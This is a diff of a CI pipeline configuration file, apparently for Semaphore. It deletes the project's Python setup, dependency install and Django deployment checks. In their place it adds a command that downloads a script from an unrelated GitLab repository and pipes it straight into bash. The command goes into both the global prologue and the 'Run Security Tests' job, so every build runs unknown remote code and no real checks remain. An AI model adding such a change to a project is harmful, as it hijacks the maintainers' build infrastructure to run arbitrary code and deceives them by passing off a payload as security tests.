@@ -9,19 +9,12 @@ execution_time_limit:
 global_job_config:
   prologue:
     commands:
-      - sem-version python 3.8
+      - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
 blocks:
-  - name: InMoo
-    task:
-      commands:
-        - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
-      jobs: []
   - name: Run Security Tests
     task:
       jobs:
         - name: Deployment Checklist
           commands:
             - checkout
-            - cache restore
-            - pip install -r requirements.txt --cache-dir .pip_cache
-            - python manage.py check --deploy --fail-level ERROR
+            - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
